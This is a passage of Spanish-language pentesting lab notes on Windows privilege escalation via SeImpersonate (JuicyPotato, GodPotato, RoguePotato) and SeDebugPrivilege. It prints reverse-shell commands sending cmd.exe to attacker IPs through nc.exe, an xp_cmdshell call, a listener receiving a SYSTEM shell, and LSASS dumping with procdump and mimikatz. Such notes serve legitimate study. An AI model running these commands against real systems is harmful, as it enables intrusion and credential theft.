+<li>Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeImpersonate..</li>
+<li>Podemos utilizar juicypotato para conseguir un token de servicio con el privilegio SeImpersonate.<ul>
+<li>Juicy potato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.</li>
+<li>https://github.com/ohpe/juicy-potato</li>
+</ul>
+</li>
+<li>Explota privilegios via DCOM/NTLM (SeImpersonate).</li>
+<li><code>JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *</code><ul>
+<li>explicación del comando:<ul>
+<li><code>-l 53375</code> es el puerto que se va a utilizar para la comunicación.</li>
+<li><code>-p c:\windows\system32\cmd.exe</code> es la ruta de la binary que se va a ejecutar.</li>
+<li><code>-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"</code> es la argumento que se va a pasar a la binary que se va a ejecutar.</li>
+<li><code>-t *</code> es el token de servicio que se va a utilizar.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Es importante tener en cuenta los <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">CLSID</a>, para extraerlos de la maquina podemos usar <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a><ul>
+<li>Entonces por ejemplo tenemos el siguiente comando: <code>.\Juicy.Potato.x86.exe -l 53375 -p c:\Windows\System32\cmd.exe -a "/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}</code></li>
+</ul>
+</li>
+<li>Este CLSID es del proceso winmgmt dentro de windows server 2008 R2 Enterprise</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">wamp</span><span class="p">\</span><span class="n">www</span><span class="p">&gt;.\</span><span class="n">Juicy</span><span class="p">.</span><span class="n">Potato</span><span class="p">.</span><span class="n">x86</span><span class="p">.</span><span class="n">exe</span> <span class="n">-l</span> <span class="n">53375</span> <span class="n">-p</span> <span class="n">c</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a</span> <span class="s2">&quot;/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe&quot;</span> <span class="n">-t</span> <span class="p">*</span> <span class="n">-c</span> <span class="p">{</span><span class="n">C49E32C6-BC8B</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="n">85D4</span><span class="p">-</span><span class="n">00105A1F8304</span><span class="p">}</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">Testing</span> <span class="p">{</span><span class="n">C49E32C6-BC8B</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="n">85D4</span><span class="p">-</span><span class="n">00105A1F8304</span><span class="p">}</span> <span class="n">53375</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="p">....</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="p">[+]</span> <span class="n">authresult</span> <span class="n">0</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">{</span><span class="n">C49E32C6-BC8B</span><span class="p">-</span><span class="n">11d2</span><span class="p">-</span><span class="n">85D4</span><span class="p">-</span><span class="n">00105A1F8304</span><span class="p">};</span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
+</span></code></pre></div>
+<hr />
+<h3 id="godpotato">GodPotato<a class="headerlink" href="#godpotato" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Afecta a versiones modernas si tenemos el privilegio SeImpersonatePrivilege.</li>
+<li><a href="https://github.com/BeichenDream/GodPotato">Repositorio</a></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">GodPotato-NET4</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="n">FFFFF</span>                   <span class="n">FFF</span>  <span class="n">FFFFFFF</span>                                                       
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>   <span class="n">FFFFFFF</span>                  <span class="n">FFF</span>  <span class="n">FFFFFFFF</span>                                                      
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>  <span class="n">FFF</span>  <span class="n">FFFF</span>                 <span class="n">FFF</span>  <span class="n">FFF</span>   <span class="n">FFF</span>             <span class="n">FFF</span>                  <span class="n">FFF</span>                
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>  <span class="n">FFF</span>   <span class="n">FFF</span>                 <span class="n">FFF</span>  <span class="n">FFF</span>   <span class="n">FFF</span>             <span class="n">FFF</span>                  <span class="n">FFF</span>                
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>  <span class="n">FFF</span>   <span class="n">FFF</span>                 <span class="n">FFF</span>  <span class="n">FFF</span>   <span class="n">FFF</span>             <span class="n">FFF</span>                  <span class="n">FFF</span>                
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a> <span class="n">FFFF</span>        <span class="n">FFFFFFF</span>   <span class="n">FFFFFFFF</span>  <span class="n">FFF</span>   <span class="n">FFF</span>  <span class="n">FFFFFFF</span>  <span class="n">FFFFFFFFF</span>   <span class="n">FFFFFF</span>  <span class="n">FFFFFFFFF</span>    <span class="n">FFFFFF</span>   
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a> <span class="n">FFFF</span>       <span class="n">FFFF</span> <span class="n">FFFF</span>  <span class="n">FFF</span> <span class="n">FFFF</span>  <span class="n">FFF</span>  <span class="n">FFFF</span> <span class="n">FFFF</span> <span class="n">FFFF</span>   <span class="n">FFF</span>      <span class="n">FFF</span>  <span class="n">FFF</span>    <span class="n">FFF</span>      <span class="n">FFF</span> <span class="n">FFFF</span>  
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a> <span class="n">FFFF</span> <span class="n">FFFFF</span> <span class="n">FFF</span>   <span class="n">FFF</span> <span class="n">FFF</span>   <span class="n">FFF</span>  <span class="n">FFFFFFFF</span>  <span class="n">FFF</span>   <span class="n">FFF</span>   <span class="n">FFF</span>      <span class="n">F</span>    <span class="n">FFF</span>    <span class="n">FFF</span>     <span class="n">FFF</span>   <span class="n">FFF</span>  
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a> <span class="n">FFFF</span>   <span class="n">FFF</span> <span class="n">FFF</span>   <span class="n">FFFFFFF</span>   <span class="n">FFF</span>  <span class="n">FFF</span>      <span class="n">FFFF</span>   <span class="n">FFF</span>   <span class="n">FFF</span>         <span class="n">FFFFF</span>    <span class="n">FFF</span>     <span class="n">FFF</span>   <span class="n">FFFF</span> 
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a> <span class="n">FFFF</span>   <span class="n">FFF</span> <span class="n">FFF</span>   <span class="n">FFFFFFF</span>   <span class="n">FFF</span>  <span class="n">FFF</span>      <span class="n">FFFF</span>   <span class="n">FFF</span>   <span class="n">FFF</span>      <span class="n">FFFFFFFF</span>    <span class="n">FFF</span>     <span class="n">FFF</span>   <span class="n">FFFF</span> 
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>  <span class="n">FFF</span>   <span class="n">FFF</span> <span class="n">FFF</span>   <span class="n">FFF</span> <span class="n">FFF</span>   <span class="n">FFF</span>  <span class="n">FFF</span>       <span class="n">FFF</span>   <span class="n">FFF</span>   <span class="n">FFF</span>     <span class="n">FFFF</span>  <span class="n">FFF</span>    <span class="n">FFF</span>     <span class="n">FFF</span>   <span class="n">FFFF</span> 
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>  <span class="n">FFFF</span> <span class="n">FFFF</span> <span class="n">FFFF</span>  <span class="n">FFF</span> <span class="n">FFFF</span>  <span class="n">FFF</span>  <span class="n">FFF</span>       <span class="n">FFF</span>  <span class="n">FFFF</span>   <span class="n">FFF</span>     <span class="n">FFFF</span>  <span class="n">FFF</span>    <span class="n">FFF</span>     <span class="n">FFFF</span>  <span class="n">FFF</span>  
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>   <span class="n">FFFFFFFF</span>  <span class="n">FFFFFFF</span>   <span class="n">FFFFFFFF</span>  <span class="n">FFF</span>        <span class="n">FFFFFFF</span>     <span class="n">FFFFFF</span>  <span class="n">FFFFFFFF</span>    <span class="n">FFFFFFF</span>  <span class="n">FFFFFFF</span>   
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>    <span class="n">FFFFFFF</span>   <span class="n">FFFFF</span>     <span class="n">FFFFFFF</span>  <span class="n">FFF</span>         <span class="n">FFFFF</span>       <span class="n">FFFFF</span>   <span class="n">FFFFFFFF</span>     <span class="n">FFFF</span>     <span class="n">FFFF</span>    
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="n">Arguments</span><span class="p">:</span>
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>    <span class="n">-cmd</span> <span class="n">Required</span><span class="p">:</span><span class="n">True</span> <span class="n">CommandLine</span> <span class="p">(</span><span class="k">default</span> <span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="n">whoami</span><span class="p">)</span>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="n">Example</span><span class="p">:</span>
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="n">GodPotato</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span> 
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="n">GodPotato</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span> 
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">&gt;</span><span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">GodPotato-NET4</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="n">c</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">GodPotato-NET4</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c whoami&quot;</span>
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="p">[*]</span> <span class="n">CombaseModule</span><span class="p">:</span> <span class="n">0x140715645927424</span>
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="p">[*]</span> <span class="n">DispatchTable</span><span class="p">:</span> <span class="n">0x140715648233536</span>
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="p">[*]</span> <span class="n">UseProtseqFunction</span><span class="p">:</span> <span class="n">0x140715647610064</span>
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="p">[*]</span> <span class="n">UseProtseqFunctionParamCount</span><span class="p">:</span> <span class="n">6</span>
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="p">[*]</span> <span class="n">HookRPC</span>
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="p">[*]</span> <span class="nb">Start </span><span class="n">PipeServer</span>
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="p">[*]</span> <span class="n">Trigger</span> <span class="n">RPCSS</span>
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="p">[*]</span> <span class="n">CreateNamedPipe</span> <span class="p">\\.\</span><span class="n">pipe</span><span class="p">\</span><span class="n">ca325e81</span><span class="p">-</span><span class="n">9e6f</span><span class="p">-</span><span class="n">49eb-a8cd-c45cec8c750b</span><span class="p">\</span><span class="n">pipe</span><span class="p">\</span><span class="n">epmapper</span>
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">GUID</span><span class="p">:</span> <span class="n">00000000</span><span class="p">-</span><span class="n">0000</span><span class="p">-</span><span class="n">0000-c000</span><span class="p">-</span><span class="n">000000000046</span>
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">IPID</span><span class="p">:</span> <span class="n">0000a802</span><span class="p">-</span><span class="n">02c0-ffff</span><span class="p">-</span><span class="n">5aab-e8e14a3bd34a</span>
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OXID</span><span class="p">:</span> <span class="n">0x2efb74e345b53fb6</span>
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">OID</span><span class="p">:</span> <span class="n">0x8313c62f83938f2f</span>
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">Flags</span><span class="p">:</span> <span class="n">0x281</span>
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="p">[*]</span> <span class="n">DCOM</span> <span class="n">obj</span> <span class="n">PublicRefs</span><span class="p">:</span> <span class="n">0x0</span>
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="p">[*]</span> <span class="n">Marshal</span> <span class="n">Object</span> <span class="n">bytes</span> <span class="n">len</span><span class="p">:</span> <span class="n">100</span>
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="p">[*]</span> <span class="n">UnMarshal</span> <span class="n">Object</span>
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="p">[*]</span> <span class="n">Pipe</span> <span class="n">Connected</span><span class="p">!</span>
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="p">[*]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">NETWORK</span> <span class="n">SERVICE</span>
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="p">[*]</span> <span class="n">CurrentsImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="p">[*]</span> <span class="nb">Start </span><span class="n">Search</span> <span class="n">System</span> <span class="n">Token</span>
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="p">[*]</span> <span class="n">PID</span> <span class="p">:</span> <span class="n">924</span> <span class="n">Token</span><span class="p">:</span><span class="n">0x816</span>  <span class="n">User</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">ImpersonationLevel</span><span class="p">:</span> <span class="n">Impersonation</span>
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="p">[*]</span> <span class="n">Find</span> <span class="n">System</span> <span class="n">Token</span> <span class="p">:</span> <span class="n">True</span>
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="p">[*]</span> <span class="n">UnmarshalObject</span><span class="p">:</span> <span class="n">0x80070776</span>
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="p">[*]</span> <span class="n">CurrentUser</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="p">[*]</span> <span class="k">process</span> <span class="nb">start </span><span class="n">with</span> <span class="n">pid</span> <span class="n">4932</span>
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span>
+</span></code></pre></div>
+<hr />
+<h3 id="rogue-potato">Rogue Potato<a class="headerlink" href="#rogue-potato" title="Permanent link">&para;</a></h3>
+<ul>
+<li>RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.</li>
+</ul>
+<div class="language-powerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">SQL</span> <span class="p">(</span><span class="n">WINLPE-SRV01</span><span class="p">\</span><span class="n">sql_dev</span>  <span class="n">dbo</span><span class="nv">@master</span><span class="p">)&gt;</span> <span class="n">xp_cmdshell</span> <span class="n">c</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="n">JuicyPotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-l</span> <span class="n">53375</span> <span class="n">-p</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a</span> <span class="s2">&quot;/c c:\tools\nc.exe 10.10.14.195 8443 -e cmd.exe&quot;</span> <span class="n">-t</span> <span class="p">*</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">output</span>                                                       
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="p">----------------------------------------------------------</span>   
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">Testing</span> <span class="p">{</span><span class="n">4991d34b</span><span class="p">-</span><span class="n">80a1</span><span class="p">-</span><span class="n">4291</span><span class="p">-</span><span class="n">83b6</span><span class="p">-</span><span class="n">3328366b9097</span><span class="p">}</span> <span class="n">53375</span>         
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="p">......</span>                                                       
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="p">[+]</span> <span class="n">authresult</span> <span class="n">0</span>                                             
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="p">{</span><span class="n">4991d34b</span><span class="p">-</span><span class="n">80a1</span><span class="p">-</span><span class="n">4291</span><span class="p">-</span><span class="n">83b6</span><span class="p">-</span><span class="n">3328366b9097</span><span class="p">};</span><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>   
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="n">NULL</span>                                                         
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="p">[+]</span> <span class="n">CreateProcessWithTokenW</span> <span class="n">OK</span>                               
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="p">[+]</span> <span class="n">calling</span> <span class="n">0x000000000088ce08</span>                               
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="n">NULL</span>                                                         
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="n">SQL</span> <span class="p">(</span><span class="n">WINLPE-SRV01</span><span class="p">\</span><span class="n">sql_dev</span>  <span class="n">dbo</span><span class="nv">@master</span><span class="p">)&gt;</span> 
+</span></code></pre></div>
+<ul>
+<li>Ahora en nuestra maquina atacante podemos escuchar en el puerto 8443.</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>└─$<span class="w"> </span>sudo<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8443</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">8443</span><span class="w"> </span>...
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.14.195<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.129.43.43<span class="o">]</span><span class="w"> </span><span class="m">49686</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">10</span>.0.14393<span class="o">]</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2016</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>whoami
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</span></code></pre></div>
+<hr />
+<h2 id="sedebugprivilege">SeDebugPrivilege<a class="headerlink" href="#sedebugprivilege" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeDebugPrivilege.</li>
+<li>Podemos usar ProcDump de Sysinternals para conseguir un un dump de memoria LSASS.</li>
+<li><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code><ul>
+<li>Ahora con esto podemos usar pypykatz en nuestra maquina atacante, o mimikatz en la maquina victima para obtener las credenciales de los servicios.</li>
+</ul>
+</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>mimikatz # log
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Using &#39;mimikatz.log&#39; for logfile : OK
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>mimikatz # sekurlsa::minidump lsass.dmp
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>Switch to MINIDUMP : &#39;lsass.dmp&#39;
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>mimikatz # sekurlsa::logonpasswords
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>Opening : &#39;lsass.dmp&#39; file for minidump...
+</span></code></pre></div>
+<ul>
+<li><code>pypykatz lsa minidump 'lsass (1).dmp'</code></li>
+<li>De todas formas siempre podemos dumpear a mano con el task manager.</li>
+<li><img alt="" src="https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png" /></li>
+</ul>
+<h3 id="rce-con-sedebugprivilege">RCE con SeDebugPrivilege<a class="headerlink" href="#rce-con-sedebugprivilege" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Se pueden elevar los privilegios ejecutando un proceso hijo con privilegios eleveados heredando los privilegios de un proceso padre.</li>
+<li>Podemos utilizar el <a href="https://github.com/decoder-it/psgetsystem">siguiente script</a><ul>
+<li><code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code></li>
+</ul>
+</li>
+</ul>
